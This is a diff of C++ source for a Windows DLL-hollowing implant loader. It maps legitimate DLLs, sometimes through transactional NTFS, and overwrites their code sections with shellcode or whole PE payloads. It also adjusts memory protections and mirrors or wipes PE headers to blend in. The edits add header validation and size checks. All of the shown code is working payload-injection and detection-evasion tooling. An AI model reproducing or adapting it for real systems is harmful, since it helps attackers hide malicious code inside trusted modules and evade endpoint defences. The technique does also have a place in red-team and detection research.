@@ -100,267 +100,278 @@ bool HollowDllImplant(const wchar_t* DllFilePath, uint8_t** ppMapBuf, uint64_t* 
 		pFileBuf = new uint8_t[dwFileSize];
 
 		if (ReadFile(hFile, pFileBuf, dwFileSize, (PDWORD)&dwBytesRead, nullptr)) {
-			SetFilePointer(hFile, 0, nullptr, FILE_BEGIN);
+			if (*(uint16_t*)&pFileBuf[0] == 'ZM') {
+				SetFilePointer(hFile, 0, nullptr, FILE_BEGIN);
 
-			IMAGE_DOS_HEADER* pDosHdr = (IMAGE_DOS_HEADER*)pFileBuf;
-			IMAGE_NT_HEADERS* pNtHdrs = (IMAGE_NT_HEADERS*)(pFileBuf + pDosHdr->e_lfanew);
-			IMAGE_SECTION_HEADER* pSectHdrs = (IMAGE_SECTION_HEADER*)((uint8_t*)&pNtHdrs->OptionalHeader + sizeof(IMAGE_OPTIONAL_HEADER));
+				IMAGE_DOS_HEADER* pDosHdr = (IMAGE_DOS_HEADER*)pFileBuf;
+				IMAGE_NT_HEADERS* pNtHdrs = (IMAGE_NT_HEADERS*)(pFileBuf + pDosHdr->e_lfanew);
+				IMAGE_SECTION_HEADER* pSectHdrs = (IMAGE_SECTION_HEADER*)((uint8_t*)&pNtHdrs->OptionalHeader + sizeof(IMAGE_OPTIONAL_HEADER));
 
-			if (pNtHdrs->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR_MAGIC) {
-				int32_t nCodeIndex = GetCodeSection(pNtHdrs, pSectHdrs, dwPayloadBufSize); // The need for this is threefold: 1) The section may be named .text, CODE, RT etc. 2) In PEs with two code sections (for example Windows PE with .text and RT) one may not be large enough but the other is. 3) There is no certainty that a section with a name such as .text will be +X in the PE headers. 
+				if (pNtHdrs->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR_MAGIC) {
+					int32_t nCodeIndex = GetCodeSection(pNtHdrs, pSectHdrs, dwPayloadBufSize); // The need for this is threefold: 1) The section may be named .text, CODE, RT etc. 2) In PEs with two code sections (for example Windows PE with .text and RT) one may not be large enough but the other is. 3) There is no certainty that a section with a name such as .text will be +X in the PE headers. 
 
-				if (SelectedPayloadType == Payload_t::None || (SelectedPayloadType == Payload_t::PE && dwRequiredSize < pNtHdrs->OptionalHeader.SizeOfImage) || (SelectedPayloadType == Payload_t::Shellcode && nCodeIndex != -1)) {
-					if ((!(qwImplantFlags & IMPLANT_FLAG_DOTNET) || pNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR].VirtualAddress)) {
-						bool bMapped = false;
-						uint32_t dwCodeRva = 0;
+					if (SelectedPayloadType == Payload_t::None || (SelectedPayloadType == Payload_t::PE && dwRequiredSize < pNtHdrs->OptionalHeader.SizeOfImage) || (SelectedPayloadType == Payload_t::Shellcode && nCodeIndex != -1 && dwRequiredSize < (pSectHdrs + nCodeIndex)->Misc.VirtualSize)) {
+						if ((!(qwImplantFlags & IMPLANT_FLAG_DOTNET) || pNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR].VirtualAddress)) {
+							bool bMapped = false;
+							uint32_t dwCodeRva = 0;
 
-						//
-						// Found a DLL with sufficient image size: map an image view of it for hollowing.
-						//
+							//
+							// Found a DLL with sufficient image size: map an image view of it for hollowing.
+							//
 
-						if ((qwImplantFlags & IMPLANT_FLAG_ISOLATED_MAP)) {
-							printf("... %ws - image size: %d - code section size: %d\r\n",DllFilePath, pNtHdrs->OptionalHeader.SizeOfImage, (pSectHdrs + nCodeIndex)->Misc.VirtualSize);
+							if ((qwImplantFlags & IMPLANT_FLAG_ISOLATED_MAP)) {
+								printf("... %ws - image size: %d - code section size: %d\r\n", DllFilePath, pNtHdrs->OptionalHeader.SizeOfImage, (pSectHdrs + nCodeIndex)->Misc.VirtualSize);
 
-							bool bTxF_Valid = pPayloadBuf != nullptr ? false : true;
+								bool bTxF_Valid = pPayloadBuf != nullptr ? false : true;
 
-							if ((qwImplantFlags & IMPLANT_FLAG_TXF) && pPayloadBuf != nullptr) {
-								//
-								// For TxF, make the modifications to the file contents now prior to mapping.
-								//
-
-								uint32_t dwBytesWritten = 0;
-
-								if (SelectedPayloadType == Payload_t::Shellcode) {
+								if ((qwImplantFlags & IMPLANT_FLAG_TXF) && pPayloadBuf != nullptr) {
 									//
-									// Wipe the data directories that conflict with the code section
+									// For TxF, make the modifications to the file contents now prior to mapping.
 									//
 
-									for (uint32_t dwX = 0; dwX < pNtHdrs->OptionalHeader.NumberOfRvaAndSizes; dwX++) {
-										if (pNtHdrs->OptionalHeader.DataDirectory[dwX].VirtualAddress >= (pSectHdrs + nCodeIndex)->VirtualAddress && pNtHdrs->OptionalHeader.DataDirectory[dwX].VirtualAddress < ((pSectHdrs + nCodeIndex)->VirtualAddress + (pSectHdrs + nCodeIndex)->Misc.VirtualSize)) {
-											pNtHdrs->OptionalHeader.DataDirectory[dwX].VirtualAddress = 0;
-											pNtHdrs->OptionalHeader.DataDirectory[dwX].Size = 0;
-										}
-									}
+									uint32_t dwBytesWritten = 0;
 
-									//
-									// Find a range free of relocations large enough to accomodate the code.
-									//
+									if (SelectedPayloadType == Payload_t::Shellcode) {
+										//
+										// Wipe the data directories that conflict with the code section
+										//
 
-									bool bRangeFound = false;
-									uint8_t* pRelocBuf = (uint8_t*)GetPAFromRVA(pFileBuf, pNtHdrs, pSectHdrs, pNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
-
-									if (pRelocBuf != nullptr) {
-										for (dwCodeRva = 0; !bRangeFound && dwCodeRva < (pSectHdrs + nCodeIndex)->Misc.VirtualSize; dwCodeRva += dwPayloadBufSize) {
-											if (!CheckRelocRange(pRelocBuf, pNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size, (pSectHdrs + nCodeIndex)->VirtualAddress + dwCodeRva, (pSectHdrs + nCodeIndex)->VirtualAddress + dwCodeRva + dwPayloadBufSize)) {
-												bRangeFound = true;
-												break;
+										for (uint32_t dwX = 0; dwX < pNtHdrs->OptionalHeader.NumberOfRvaAndSizes; dwX++) {
+											if (pNtHdrs->OptionalHeader.DataDirectory[dwX].VirtualAddress >= (pSectHdrs + nCodeIndex)->VirtualAddress && pNtHdrs->OptionalHeader.DataDirectory[dwX].VirtualAddress < ((pSectHdrs + nCodeIndex)->VirtualAddress + (pSectHdrs + nCodeIndex)->Misc.VirtualSize)) {
+												pNtHdrs->OptionalHeader.DataDirectory[dwX].VirtualAddress = 0;
+												pNtHdrs->OptionalHeader.DataDirectory[dwX].Size = 0;
 											}
 										}
 
-										if (bRangeFound) {
-											printf("... found a blank region with code section to accomodate payload at 0x%08x\r\n", dwCodeRva);
+										//
+										// Find a range free of relocations large enough to accomodate the code.
+										//
+
+										bool bRangeFound = false;
+										uint8_t* pRelocBuf = (uint8_t*)GetPAFromRVA(pFileBuf, pNtHdrs, pSectHdrs, pNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
+
+										if (pRelocBuf != nullptr) {
+											for (dwCodeRva = 0; !bRangeFound && dwCodeRva < (pSectHdrs + nCodeIndex)->Misc.VirtualSize; dwCodeRva += dwPayloadBufSize) {
+												if (!CheckRelocRange(pRelocBuf, pNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size, (pSectHdrs + nCodeIndex)->VirtualAddress + dwCodeRva, (pSectHdrs + nCodeIndex)->VirtualAddress + dwCodeRva + dwPayloadBufSize)) {
+													bRangeFound = true;
+													break;
+												}
+											}
+
+											if (bRangeFound) {
+												printf("... found a blank region with code section to accomodate payload at 0x%08x\r\n", dwCodeRva);
+											}
+											else {
+												printf("... failed to identify a blank region large enough to accomodate payload\r\n");
+											}
+
+											memcpy(pFileBuf + (pSectHdrs + nCodeIndex)->PointerToRawData + dwCodeRva, pPayloadBuf, dwPayloadBufSize);
+
+											if (WriteFile(hFile, pFileBuf, dwFileSize, (PDWORD)&dwBytesWritten, nullptr)) {
+												printf("... successfully modified TxF file content to include shellcode in its .text section.\r\n");
+												bTxF_Valid = true;
+											}
 										}
 										else {
-											printf("... failed to identify a blank region large enough to accomodate payload\r\n");
+											printf("... No relocation directory present.\r\n");
 										}
+									}
+									else if (SelectedPayloadType == Payload_t::PE) {
+										//
+										// Since the PE is still physical, it does not need to be bootstrapped (Windows will do this for me when the section is created). Simply overwrite the target PE with the payload PE.
+										//
 
-										memcpy(pFileBuf + (pSectHdrs + nCodeIndex)->PointerToRawData + dwCodeRva, pPayloadBuf, dwPayloadBufSize);
-
-										if (WriteFile(hFile, pFileBuf, dwFileSize, (PDWORD)&dwBytesWritten, nullptr)) {
-											printf("... successfully modified TxF file content to include shellcode in its .text section.\r\n");
+										if (WriteFile(hFile, pPayloadBuf, dwPayloadBufSize, (PDWORD)&dwBytesWritten, nullptr)) {
+											printf("... successfully modified TxF file content (overwritten with entire payload PE).\r\n");
 											bTxF_Valid = true;
 										}
 									}
-									else {
-										printf("... No relocation directory present.\r\n");
-									}
 								}
-								else if (SelectedPayloadType == Payload_t::PE) {
-									//
-									// Since the PE is still physical, it does not need to be bootstrapped (Windows will do this for me when the section is created). Simply overwrite the target PE with the payload PE.
-									//
 
-									if (WriteFile(hFile, pPayloadBuf, dwPayloadBufSize, (PDWORD)&dwBytesWritten, nullptr)) {
-										printf("... successfully modified TxF file content (overwritten with entire payload PE).\r\n");
-										bTxF_Valid = true;
-									}
-								}
-							}
-
-							if (!(qwImplantFlags & IMPLANT_FLAG_TXF) || bTxF_Valid) {
-								HANDLE hSection = nullptr; // Using SEC_IMAGE_NO_EXECUTE allocates one giant +R MEM_IMAGE region, which does not split into multiple different permissions even when +RW or +RX is set with VirtualProtect. Oddly, permissions can be changed and data written. When written, the single region which has a size equal to the mapped size but a commit size of 0, will go up to 4096 as a single page is written. The entire image region is always private.
-								NtStatus = NtCreateSection(&hSection, SECTION_ALL_ACCESS, nullptr, nullptr, PAGE_READONLY, SEC_IMAGE, hFile); // "The operating system does not call load-image notify routines when sections created with the SEC_IMAGE_NO_EXECUTE attribute are mapped to virtual memory." - https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nc-ntddk-pload_image_notify_routine
-
-								if (NT_SUCCESS(NtStatus)) {
-									*pqwMapBufSize = 0; // The map view is an in and out parameter, if it isn't zero the map may have its size overwritten
-									NtStatus = NtMapViewOfSection(hSection, GetCurrentProcess(), (void**)ppMapBuf, 0, 0, nullptr, (PSIZE_T)pqwMapBufSize, 1, 0, PAGE_READONLY); // AllocationType of MEM_COMMIT|MEM_RESERVE is not needed for SEC_IMAGE.
+								if (!(qwImplantFlags & IMPLANT_FLAG_TXF) || bTxF_Valid) {
+									HANDLE hSection = nullptr; // Using SEC_IMAGE_NO_EXECUTE allocates one giant +R MEM_IMAGE region, which does not split into multiple different permissions even when +RW or +RX is set with VirtualProtect. Oddly, permissions can be changed and data written. When written, the single region which has a size equal to the mapped size but a commit size of 0, will go up to 4096 as a single page is written. The entire image region is always private.
+									NtStatus = NtCreateSection(&hSection, SECTION_ALL_ACCESS, nullptr, nullptr, PAGE_READONLY, SEC_IMAGE, hFile); // "The operating system does not call load-image notify routines when sections created with the SEC_IMAGE_NO_EXECUTE attribute are mapped to virtual memory." - https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nc-ntddk-pload_image_notify_routine
 
 									if (NT_SUCCESS(NtStatus)) {
-										bMapped = true;
+										*pqwMapBufSize = 0; // The map view is an in and out parameter, if it isn't zero the map may have its size overwritten
+										NtStatus = NtMapViewOfSection(hSection, GetCurrentProcess(), (void**)ppMapBuf, 0, 0, nullptr, (PSIZE_T)pqwMapBufSize, 1, 0, PAGE_READONLY); // AllocationType of MEM_COMMIT|MEM_RESERVE is not needed for SEC_IMAGE.
+
+										if (NT_SUCCESS(NtStatus)) {
+											bMapped = true;
+										}
+										else {
+											printf("... failed to create mapping of section (error 0x%08x)\r\n", NtStatus);
+										}
 									}
 									else {
-										printf("... failed to create mapping of section (error 0x%08x)\r\n", NtStatus);
+										printf("... failed to create section (error 0x%x)\r\n", NtStatus);
 									}
 								}
 								else {
-									printf("... failed to create section (error 0x%x)\r\n", NtStatus);
+									printf("... TxF initialization failed.\r\n");
 								}
 							}
 							else {
-								printf("... TxF initialization failed.\r\n");
-							}
-						}
-						else {
-							*ppMapBuf = (uint8_t*)LoadLibraryW(DllFilePath);
+								*ppMapBuf = (uint8_t*)LoadLibraryW(DllFilePath);
 
-							if (*ppMapBuf != nullptr) {
-								MODULEINFO ModInfo = { 0 };
+								if (*ppMapBuf != nullptr) {
+									MODULEINFO ModInfo = { 0 };
 
-								printf("... successfully loaded %ws at 0x%p\r\n",DllFilePath, *ppMapBuf);
+									printf("... successfully loaded %ws at 0x%p\r\n", DllFilePath, *ppMapBuf);
 
-								if (GetModuleInformation(GetCurrentProcess(), (HMODULE)*ppMapBuf, &ModInfo, sizeof(ModInfo))) {
-									printf("... successfully queried module size: %d\r\n", ModInfo.SizeOfImage);
-									*pqwMapBufSize = ModInfo.SizeOfImage;
+									if (GetModuleInformation(GetCurrentProcess(), (HMODULE)*ppMapBuf, &ModInfo, sizeof(ModInfo))) {
+										printf("... successfully queried module size: %d\r\n", ModInfo.SizeOfImage);
+										*pqwMapBufSize = ModInfo.SizeOfImage;
+									}
+									else {
+										printf("... failed to query module info for %ws\r\n", DllFilePath);
+										IMAGE_DOS_HEADER* pDosHdr = (IMAGE_DOS_HEADER*)*ppMapBuf;
+										IMAGE_NT_HEADERS* pNtHdrs = (IMAGE_NT_HEADERS*)(*ppMapBuf + pDosHdr->e_lfanew);
+										printf("... sizeOfImage: %d\r\n", pNtHdrs->OptionalHeader.SizeOfImage);
+										*pqwMapBufSize = pNtHdrs->OptionalHeader.SizeOfImage;
+									}
+
+									bMapped = true;
 								}
-								else {
-									printf("... failed to query module info for %ws\r\n", DllFilePath);
-									IMAGE_DOS_HEADER* pDosHdr = (IMAGE_DOS_HEADER*)*ppMapBuf;
-									IMAGE_NT_HEADERS* pNtHdrs = (IMAGE_NT_HEADERS*)(*ppMapBuf + pDosHdr->e_lfanew);
-									printf("... sizeOfImage: %d\r\n", pNtHdrs->OptionalHeader.SizeOfImage);
-									*pqwMapBufSize = pNtHdrs->OptionalHeader.SizeOfImage;
-								}
-
-								bMapped = true;
 							}
-						}
 
-						if (bMapped) {
-							//
-							// Implant the payload into the mapped image.
-							//
+							if (bMapped) {
+								//
+								// Implant the payload into the mapped image.
+								//
 
-							if ((qwImplantFlags & IMPLANT_FLAG_TXF)) {
-								IMAGE_DOS_HEADER* pPayloadDosHdr = (IMAGE_DOS_HEADER*)*ppMapBuf;
-								IMAGE_NT_HEADERS* pPayloadNtHdrs = (IMAGE_NT_HEADERS*)(*ppMapBuf + pPayloadDosHdr->e_lfanew);
-								int32_t nImpCount = BootstrapImports(*ppMapBuf, false); // Section alignment, base relocations and section permissions will already be handled by mapping the view of the section. The only initialization that remains is the IAT module loads and thunks
+								if ((qwImplantFlags & IMPLANT_FLAG_TXF)) {
+									IMAGE_DOS_HEADER* pPayloadDosHdr = (IMAGE_DOS_HEADER*)*ppMapBuf;
+									IMAGE_NT_HEADERS* pPayloadNtHdrs = (IMAGE_NT_HEADERS*)(*ppMapBuf + pPayloadDosHdr->e_lfanew);
+									int32_t nImpCount = BootstrapImports(*ppMapBuf, false); // Section alignment, base relocations and section permissions will already be handled by mapping the view of the section. The only initialization that remains is the IAT module loads and thunks
 
-								printf("... Bootstrapped %d imports into TxF hollowed image post-mapping.\r\n", nImpCount);
-								*ppEntryPoint = (SelectedPayloadType == Payload_t::PE ? (*ppMapBuf + pPayloadNtHdrs->OptionalHeader.AddressOfEntryPoint) : (*ppMapBuf + (pSectHdrs + nCodeIndex)->VirtualAddress + dwCodeRva));
+									printf("... Bootstrapped %d imports into TxF hollowed image post-mapping.\r\n", nImpCount);
+									*ppEntryPoint = (SelectedPayloadType == Payload_t::PE ? (*ppMapBuf + pPayloadNtHdrs->OptionalHeader.AddressOfEntryPoint) : (*ppMapBuf + (pSectHdrs + nCodeIndex)->VirtualAddress + dwCodeRva));
 
-								if (SelectedPayloadType == Payload_t::Shellcode) {
-									printf("... selected code section %s (index %d) for TxF hollowing.\r\n", (pSectHdrs + nCodeIndex)->Name, nCodeIndex);
-								}
-
-								bHollowed = true;
-							}
-							else if (*pqwMapBufSize >= dwRequiredSize) { // Verify that the mapped size is of sufficient size for the payload+moat. There are quirks to image mapping that can result in the image size not matching the mapped size.
-								*ppEntryPoint = (SelectedPayloadType == Payload_t::PE ? *ppMapBuf : (*ppMapBuf + (pSectHdrs + nCodeIndex)->VirtualAddress + dwCodeRva));
-								printf("... %ws - 0x%p [payload base: 0x%p] mapped size: %I64u\r\n", DllFilePath, *ppMapBuf, *ppEntryPoint, *pqwMapBufSize);
-
-								if (pPayloadBuf != nullptr) {
 									if (SelectedPayloadType == Payload_t::Shellcode) {
-										uint32_t dwOldProtect = 0;
-										MEMORY_BASIC_INFORMATION64 BasicInfo = { 0 };
-										bool bValidSblock = true;
+										printf("... selected code section %s (index %d) for TxF hollowing.\r\n", (pSectHdrs + nCodeIndex)->Name, nCodeIndex);
+									}
 
-										printf("... selected code section %s (index %d) for hollowing at 0x%p\r\n", (pSectHdrs + nCodeIndex)->Name, nCodeIndex, *ppEntryPoint);
+									bHollowed = true;
+								}
+								else if (*pqwMapBufSize >= dwRequiredSize) { // Verify that the mapped size is of sufficient size for the payload+moat. There are quirks to image mapping that can result in the image size not matching the mapped size.
+									*ppEntryPoint = (SelectedPayloadType == Payload_t::PE ? *ppMapBuf : (*ppMapBuf + (pSectHdrs + nCodeIndex)->VirtualAddress + dwCodeRva));
+									printf("... %ws - 0x%p [payload base: 0x%p] mapped size: %I64u\r\n", DllFilePath, *ppMapBuf, *ppEntryPoint, *pqwMapBufSize);
 
-										//
-										// In some cases (.NET commonly among them) the code section may carry the executable permission on disk, but after being mapped will lose this attribute and become readonly. Query the sblocks associated with the selected code hollow pointer and modify their permissions to include +X if needed.
-										//
+									if (pPayloadBuf != nullptr) {
+										if (SelectedPayloadType == Payload_t::Shellcode) {
+											uint32_t dwOldProtect = 0;
+											MEMORY_BASIC_INFORMATION64 BasicInfo = { 0 };
+											bool bValidSblock = true;
 
-										if (VirtualQueryEx(GetCurrentProcess(), *ppEntryPoint, (MEMORY_BASIC_INFORMATION*)&BasicInfo, sizeof(MEMORY_BASIC_INFORMATION)) == sizeof(MEMORY_BASIC_INFORMATION)) {
-											if ((*ppEntryPoint + dwPayloadBufSize) < ((uint8_t*)BasicInfo.BaseAddress + BasicInfo.RegionSize)) { // In the event that the code section has been split into multiple sblocks with varying different permissions, skip it and fail the hollowing.
-												printf("... sblock at 0x%p has sufficient size to include the entire payload.\r\n", BasicInfo.BaseAddress);
+											printf("... selected code section %s (index %d) for hollowing at 0x%p\r\n", (pSectHdrs + nCodeIndex)->Name, nCodeIndex, *ppEntryPoint);
 
-												if (BasicInfo.Protect != PAGE_EXECUTE_READ && BasicInfo.Protect != PAGE_EXECUTE_READWRITE && BasicInfo.Protect != PAGE_EXECUTE_WRITECOPY) {
-													printf("... non-executable code section sblock.\r\n");
+											//
+											// In some cases (.NET commonly among them) the code section may carry the executable permission on disk, but after being mapped will lose this attribute and become readonly. Query the sblocks associated with the selected code hollow pointer and modify their permissions to include +X if needed.
+											//
 
-													if (BasicInfo.Protect == PAGE_READWRITE) {
-														if (!VirtualProtect(*ppEntryPoint, dwPayloadBufSize, PAGE_EXECUTE_READWRITE, (PDWORD)&dwOldProtect)) {
-															bValidSblock = false;
+											if (VirtualQueryEx(GetCurrentProcess(), *ppEntryPoint, (MEMORY_BASIC_INFORMATION*)&BasicInfo, sizeof(MEMORY_BASIC_INFORMATION)) == sizeof(MEMORY_BASIC_INFORMATION)) {
+												if ((*ppEntryPoint + dwPayloadBufSize) < ((uint8_t*)BasicInfo.BaseAddress + BasicInfo.RegionSize)) { // In the event that the code section has been split into multiple sblocks with varying different permissions, skip it and fail the hollowing.
+													printf("... sblock at 0x%p has sufficient size to include the entire payload.\r\n", BasicInfo.BaseAddress);
+
+													if (BasicInfo.Protect != PAGE_EXECUTE_READ && BasicInfo.Protect != PAGE_EXECUTE_READWRITE && BasicInfo.Protect != PAGE_EXECUTE_WRITECOPY) {
+														printf("... non-executable code section sblock.\r\n");
+
+														if (BasicInfo.Protect == PAGE_READWRITE) {
+															if (!VirtualProtect(*ppEntryPoint, dwPayloadBufSize, PAGE_EXECUTE_READWRITE, (PDWORD)&dwOldProtect)) {
+																bValidSblock = false;
+															}
+														}
+														else {
+															if (!VirtualProtect(*ppEntryPoint, dwPayloadBufSize, PAGE_EXECUTE_READ, (PDWORD)&dwOldProtect)) {
+																bValidSblock = false;
+															}
 														}
 													}
-													else {
-														if (!VirtualProtect(*ppEntryPoint, dwPayloadBufSize, PAGE_EXECUTE_READ, (PDWORD)&dwOldProtect)) {
-															bValidSblock = false;
-														}
+												}
+												else {
+													printf("... sblock at 0x%p does not have sufficient size to include the entire payload.\r\n", BasicInfo.BaseAddress);
+													bValidSblock = false;
+												}
+											}
+											else {
+												printf("... failed to query attributes of virtual memory corresponding to hollowed code at 0x%p\r\n", *ppEntryPoint);
+												bValidSblock = false;
+											}
+
+											if (bValidSblock) {
+												if (VirtualProtect(*ppEntryPoint, dwPayloadBufSize, PAGE_READWRITE, (PDWORD)&dwOldProtect)) {
+													memcpy(*ppEntryPoint, pPayloadBuf, dwPayloadBufSize);
+
+													//if (VirtualProtect(*ppEntryPoint, dwPayloadBufSize, PAGE_EXECUTE_READ, (PDWORD)&dwOldProtect)) {
+													if (VirtualProtect(*ppEntryPoint, dwPayloadBufSize, dwOldProtect, (PDWORD)&dwOldProtect)) {
+														bHollowed = true;
 													}
 												}
 											}
 											else {
-												printf("... sblock at 0x%p does not have sufficient size to include the entire payload.\r\n", BasicInfo.BaseAddress);
-												bValidSblock = false;
+												printf("... sblock for code section to hollow is invalid, either due to multiple sblocks or an inability to reset its permissions correctly.\r\n");
 											}
 										}
-										else {
-											printf("... failed to query attributes of virtual memory corresponding to hollowed code at 0x%p\r\n", *ppEntryPoint);
-											bValidSblock = false;
-										}
+										else if (SelectedPayloadType == Payload_t::PE) {
+											uint32_t dwNewPeImgSize = 0;
+											uint8_t* pNewPeImageBase = nullptr, * pNewPeEntryPoint = nullptr;
+											uint64_t qwMapBufSize;
 
-										if (bValidSblock) {
-											if (VirtualProtect(*ppEntryPoint, dwPayloadBufSize, PAGE_READWRITE, (PDWORD)&dwOldProtect)) {
-												memcpy(*ppEntryPoint, pPayloadBuf, dwPayloadBufSize);
+											printf("... bootstrapping PE to hollowed image memory...\r\n");
 
-												//if (VirtualProtect(*ppEntryPoint, dwPayloadBufSize, PAGE_EXECUTE_READ, (PDWORD)&dwOldProtect)) {
-												if (VirtualProtect(*ppEntryPoint, dwPayloadBufSize, dwOldProtect, (PDWORD)&dwOldProtect)) {
-													bHollowed = true;
-												}
+											if (BootstrapPe((uint8_t*)pPayloadBuf, &pNewPeImageBase, &pNewPeEntryPoint, &dwNewPeImgSize, *ppMapBuf, *pqwMapBufSize, qwImplantFlags, dwMoatSize)) {
+												printf("... bootstrap successful : 0x%p [%d bytes]\r\n", pNewPeImageBase, dwNewPeImgSize);
+												bHollowed = true;
+												*ppEntryPoint = pNewPeEntryPoint;
 											}
-										}
-										else {
-											printf("... sblock for code section to hollow is invalid, either due to multiple sblocks or an inability to reset its permissions correctly.\r\n");
+											else {
+												printf("... failed to bootstrap PE in to hollowed map view\r\n");
+											}
 										}
 									}
-									else if (SelectedPayloadType == Payload_t::PE) {
-										uint32_t dwNewPeImgSize = 0;
-										uint8_t* pNewPeImageBase = nullptr, * pNewPeEntryPoint = nullptr;
-										uint64_t qwMapBufSize;
-
-										printf("... bootstrapping PE to hollowed image memory...\r\n");
-
-										if (BootstrapPe((uint8_t*)pPayloadBuf, &pNewPeImageBase, &pNewPeEntryPoint, &dwNewPeImgSize, *ppMapBuf, *pqwMapBufSize, qwImplantFlags, dwMoatSize)) {
-											printf("... bootstrap successful : 0x%p [%d bytes]\r\n", pNewPeImageBase, dwNewPeImgSize);
-											bHollowed = true;
-											*ppEntryPoint = pNewPeEntryPoint;
-										}
-										else {
-											printf("... failed to bootstrap PE in to hollowed map view\r\n");
-										}
+									else {
+										bHollowed = true;
 									}
 								}
 								else {
-									bHollowed = true;
+									printf("... mapped view size: %d | SizeOfImage: %d\r\n", *pqwMapBufSize, pNtHdrs->OptionalHeader.SizeOfImage);
 								}
-							}
-							else {
-								printf("... mapped view size: %d | SizeOfImage: %d\r\n", *pqwMapBufSize, pNtHdrs->OptionalHeader.SizeOfImage);
-							}
 
-							//
-							// Mirror the PE of the hollowed DLL onto the implant. This may be redundant if it was a shellcode implant, which will have already preserved the authentic PE headers.
-							//
+								//
+								// Mirror the PE of the hollowed DLL onto the implant. This may be redundant if it was a shellcode implant, which will have already preserved the authentic PE headers.
+								//
 
-							if ((qwImplantFlags & IMPLANT_FLAG_MIRROR_PE_HDR)) {
-								if (MirrorPeHdrs(pFileBuf, *ppMapBuf)) {
-									printf("... successfully mirrored PE headers of %ws to implant\r\n", DllFilePath);
+								if ((qwImplantFlags & IMPLANT_FLAG_MIRROR_PE_HDR)) {
+									if (MirrorPeHdrs(pFileBuf, *ppMapBuf)) {
+										printf("... successfully mirrored PE headers of %ws to implant\r\n", DllFilePath);
+									}
+									else {
+										printf("... failed to mirror PE headers of %ws to implant\r\n", DllFilePath);
+									}
 								}
-								else {
-									printf("... failed to mirror PE headers of %ws to implant\r\n", DllFilePath);
+
+								if ((qwImplantFlags & IMPLANT_FLAG_WIPE_PE_HDR)) {
+									if (WipePeHdrs(*ppMapBuf)) {
+										printf("... successfully wiped PE headers of implant in allocated memory.\r\n");
+									}
+									else {
+										printf("... failed to wipe PE headers of implant in allocated memory.\r\n");
+									}
 								}
 							}
-
-							if ((qwImplantFlags & IMPLANT_FLAG_WIPE_PE_HDR)) {
-								if (WipePeHdrs(*ppMapBuf)) {
-									printf("... successfully wiped PE headers of implant in allocated memory.\r\n");
-								}
-								else {
-									printf("... failed to wipe PE headers of implant in allocated memory.\r\n");
-								}
-							}
-						}
-					} // else not a .NET DLL although required
+						} // else not a .NET DLL although required
+					}
+					else {
+						printf("... module size of %d is too small to accomodate payload of size %d or code section size of %d too small\r\n", pNtHdrs->OptionalHeader.SizeOfImage, dwRequiredSize, nCodeIndex == -1 ? -1 : (pSectHdrs + nCodeIndex)->Misc.VirtualSize);
+					}
 				}
+				else {
+					printf("... invalid NT header magic\r\n");
+				}
+			}
+			else {
+				printf("... invalid MZ header\r\n");
 			}
 		}
 
@@ -404,7 +415,7 @@ bool HollowDllScan(const wchar_t* TargetPath, uint8_t** ppMapBuf, uint64_t* pqwM
 					if ((Wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
 						bHollowed = HollowDllScan(Wfd.cFileName, ppMapBuf, pqwMapBufSize, pPayloadBuf, dwPayloadBufSize, ppEntryPoint, SelectedPayloadType, qwImplantFlags, dwMoatSize);
 					}
-					else if (wcsstr(Wfd.cFileName, L".dll") != nullptr && GetModuleHandleW(Wfd.cFileName) == nullptr) {
+					else if (_wcsicmp(Wfd.cFileName + wcslen(Wfd.cFileName) - 4, L".dll") == 0 && GetModuleHandleW(Wfd.cFileName) == nullptr) {
 						wchar_t FilePath[MAX_PATH];
 
 						wcscpy_s(FilePath, MAX_PATH, CurrentDirectory);
@@ -433,10 +444,6 @@ uint8_t* DynamicAllocImplant(HANDLE hProcess, bool bRemoteApi, uint8_t* pPayload
 	static NtCreateSection_t NtCreateSection = (NtCreateSection_t)GetProcAddress(hNtdll, "NtCreateSection");
 	static NtMapViewOfSection_t NtMapViewOfSection = (NtMapViewOfSection_t)GetProcAddress(hNtdll, "NtMapViewOfSection");
 
-	if ((qwImplantFlags & IMPLANT_FLAG_MOAT)) {
-		dwAllocatedRegionSize += dwMoatSize;
-	}
-
 	if (pPayloadBuf != nullptr) {
 		if (SelectedPayloadType == Payload_t::PE) {
 			IMAGE_DOS_HEADER* pDosHdr = (IMAGE_DOS_HEADER*)pPayloadBuf;
@@ -446,6 +453,10 @@ uint8_t* DynamicAllocImplant(HANDLE hProcess, bool bRemoteApi, uint8_t* pPayload
 				dwAllocatedRegionSize = pNtHdrs->OptionalHeader.SizeOfImage;
 			}
 		}
+	}
+
+	if ((qwImplantFlags & IMPLANT_FLAG_MOAT)) {
+		dwAllocatedRegionSize += dwMoatSize;
 	}
 
 	if ((qwImplantFlags & IMPLANT_FLAG_MEM_PRIVATE)) {
